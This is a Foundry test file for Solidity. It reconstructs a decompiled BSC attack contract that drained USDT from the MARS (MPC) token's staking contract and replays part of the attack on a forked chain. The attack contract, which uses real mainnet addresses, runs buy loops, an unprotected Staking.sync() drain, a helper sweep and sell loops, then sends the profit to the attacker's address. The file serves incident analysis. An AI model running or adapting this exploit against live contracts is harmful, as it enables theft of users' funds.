// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IMars {
    function presale() external view returns (bool);
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IStaking {
    function sync() external;
}

contract DecompiledAttack_0x02c35d91bf955040b986b00938d819ea9ca42235 {
    address private constant OWNER = 0x2524b98F1bF4F030A4524C7e2dDCCf2F61c5b9D4;
    address private constant PANCAKE_ROUTER_V2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant FLASH_LENDER = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;

    uint256 private constant DEADLINE = 0x7497be06d8e3c3;
    uint256 private constant AMOUNT_OUT_MIN = 1;
    uint256 private constant CHUNK_DIVISOR = 11;
    uint256 private constant APPROVE_AMOUNT = 0x0c9f2c9cd04674edea40000000;

    address public staking = 0x550167A2C39F9d70A5DC98ABfA603bd4D1FAB12f;
    uint256 public sellLoops = 7;
    uint256 public buyLoops = 15;
    address public token = 0xA8b9c16E2A95d045254996281C7496112e80192E;
    address public pair = 0x1389928c3C00b5022804e1E62cf8963C71A22067;
    address public helper = 0x66ac34e40Ca83f2420099CDc36b1Ca70B2FbCE54;
    address public usdt = 0x55d398326f99059fF775485246999027B3197955;

    fallback() external {}

    function execute(uint256 amountBorrowed, uint256 repayAmount) external {
        address[] memory pathSell = new address[](2);
        pathSell[0] = token;
        pathSell[1] = usdt;

        _call(token, abi.encodeWithSelector(0x095ea7b3, PANCAKE_ROUTER_V2, APPROVE_AMOUNT));
        _call(usdt, abi.encodeWithSelector(0x095ea7b3, PANCAKE_ROUTER_V2, APPROVE_AMOUNT));

        address[] memory pathBuy = new address[](2);
        pathBuy[0] = usdt;
        pathBuy[1] = token;

        uint256 buyAmountPerSwap = amountBorrowed / buyLoops;
        for (uint256 i = 0; i < buyLoops; i++) {
            IUniswapV2Router02(PANCAKE_ROUTER_V2)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    buyAmountPerSwap,
                    AMOUNT_OUT_MIN,
                    pathBuy,
                    helper,
                    DEADLINE
                );
        }

        IStaking(staking).sync();

        _call(helper, abi.encodeWithSelector(bytes4(0x7f017f5d), token));

        for (uint256 i = 0; i < sellLoops; i++) {
            uint256 amountIn = IERC20(token).balanceOf(pair) / CHUNK_DIVISOR;
            IUniswapV2Router02(PANCAKE_ROUTER_V2)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    amountIn,
                    AMOUNT_OUT_MIN,
                    pathSell,
                    address(this),
                    DEADLINE
                );
        }

        _call(usdt, abi.encodeWithSelector(0x095ea7b3, FLASH_LENDER, repayAmount));

        uint256 profit = IERC20(usdt).balanceOf(address(this)) - repayAmount;
        _call(usdt, abi.encodeWithSelector(0xa9059cbb, OWNER, profit));
    }

    function _call(address target, bytes memory data) private {
        (bool ok,) = target.call(data);
        require(ok);
    }
}

contract Exp is Test {
    // BSC addresses (same as the incident).
    address private constant MARS_ADDR = 0xA8b9c16E2A95d045254996281C7496112e80192E;
    address private constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;
    address private constant STAKING_ADDR = 0x550167A2C39F9d70A5DC98ABfA603bd4D1FAB12f;
    address private constant HELPER_ADDR = 0x66ac34e40Ca83f2420099CDc36b1Ca70B2FbCE54;

    address private constant ATTACKER_EOA = 0x2524b98F1bF4F030A4524C7e2dDCCf2F61c5b9D4;

    uint256 private constant TX_BLOCK = 71845321;
    uint256 private constant FORK_BLOCK = TX_BLOCK - 1;
    uint256 private constant TX_TIMESTAMP = 1765885879;

    uint256 private constant STAKING_USDT_PRE = 13310826797185426593275;

    IERC20 private constant USDT = IERC20(USDT_ADDR);
    IERC20 private constant MARS = IERC20(MARS_ADDR);
    IMars private constant MARS_META = IMars(MARS_ADDR);

    function setUp() public {
        string memory rpcUrl = vm.envOr("BSC_RPC_URL", vm.envOr("RPC_URL", string("")));
        require(bytes(rpcUrl).length != 0, "Set BSC_RPC_URL or RPC_URL to an archive node");

        vm.createSelectFork(rpcUrl, FORK_BLOCK);

        vm.label(MARS_ADDR, "MARS(MPC)");
        vm.label(USDT_ADDR, "USDT");
        vm.label(STAKING_ADDR, "Staking");
        vm.label(HELPER_ADDR, "Helper");
        vm.label(ATTACKER_EOA, "AttackerEOA");
        vm.label(MARS_META.uniswapV2Pair(), "MPC-USDT Pair");
    }

    function test_execute_partial_flow_uses_helper() public {
        vm.roll(TX_BLOCK);
        vm.warp(TX_TIMESTAMP);

        assertTrue(MARS_META.presale(), "presale should be true");
        assertEq(USDT.balanceOf(STAKING_ADDR), STAKING_USDT_PRE, "staking USDT prestate mismatch");
        assertEq(MARS.balanceOf(HELPER_ADDR), 0, "helper MPC prestate mismatch");

        DecompiledAttack_0x02c35d91bf955040b986b00938d819ea9ca42235 attack =
            new DecompiledAttack_0x02c35d91bf955040b986b00938d819ea9ca42235();
        vm.label(address(attack), "ReconstructedAttack");

        // Skip the sell loop: this test focuses on the "buy → to=helper → sweep back" pattern.
        // Storage layout matches the on-chain contract: slot1 = sellLoops.
        vm.store(address(attack), bytes32(uint256(1)), bytes32(uint256(0)));

        uint256 amountBorrowed = attack.buyLoops() * 1e18; // 1 USDT per buy loop.
        deal(USDT_ADDR, address(attack), amountBorrowed);

        uint256 beforeAttackMpc = MARS.balanceOf(address(attack));

        vm.deal(ATTACKER_EOA, 1 ether);
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        attack.execute(amountBorrowed, 0);
        vm.stopPrank();

        // Root cause: anyone can drain Staking's USDT into the LP via Staking.sync().
        assertEq(USDT.balanceOf(STAKING_ADDR), 0, "staking should be drained");

        // The router buys send MPC to `helper`, then `helper.0x7f017f5d(MPC)` sweeps it back to the caller.
        assertEq(MARS.balanceOf(HELPER_ADDR), 0, "helper should be swept back to 0");
        assertGt(MARS.balanceOf(address(attack)), beforeAttackMpc, "attack should receive MPC from helper");
    }
}
